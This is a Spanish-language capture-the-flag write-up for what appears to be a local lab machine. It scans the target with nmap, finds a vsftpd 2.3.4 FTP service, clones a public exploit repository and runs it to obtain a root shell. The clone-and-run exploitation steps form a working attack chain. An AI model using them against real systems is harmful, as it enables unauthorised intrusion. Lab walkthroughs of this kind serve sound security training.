# 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

![image.png](attachment:6aa4ed62-cd8c-4497-b8d9-680415171d93:image.png)

A continuación, lanzamos un escaneo con `nmap`para realizar un escaneo de puertos y servicios detallado en la dirección IP:

```bash
nmap -sS --open -p- 172.17.0.2
```

![image.png](attachment:2abf43ea-2a95-43f7-b18b-89031cf106a7:image.png)

Como podemos observar durante el escaneo que el **puerto 21** perteneciente al **servicio FTP** está abierto.

# 🔎 **EXPLORACIÓN**

Con el siguiente comando de `nmap` conseguimos ver la versión del servidor ftp:

```bash
nmap -p21 -sCV 172.17.0.2
```

![image.png](attachment:0ac99a1b-5093-4906-b6ac-e97cfc9be580:image.png)

Como se puede observar, la versión del servicio **FTP** nos puede ayudar, ya que podría ser vulnerable. Para verificar esto, realizamos una búsqueda en Google y encontramos el siguiente repositorio de GitHub:

https://github.com/Hellsender01/vsftpd_2.3.4_Exploit

El repositorio consta del siguiente exploit:

![image.png](attachment:5153bed7-bc38-4399-9f51-59b73c7aab13:image.png)

# 🚀 **EXPLOTACIÓN**

Seguimos las instrucciones indicadas en el repositorio, lo que nos permite crear una reverse shell con privilegios de usuario **root** en la máquina. Para ello, se realizan los siguientes comandos:

```bash
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
cd vsftpd_2.3.4_Exploit/
chmod +x exploit.py
```

A continuación, ya podemos ejecutar el exploit con:

```
python3 exploit.py 172.17.0.2
```

![image.png](attachment:01e7b35c-e9d0-47b9-8823-cdba33d72a19:image.png)

# 🔐 **PRIVILEGIOS**

Tras estar dentro de la shell, comprobamos quiénes somos a través de:

```bash
whoami
```

Observamos que somos **root** por lo que tenemos el máximo de privilegios.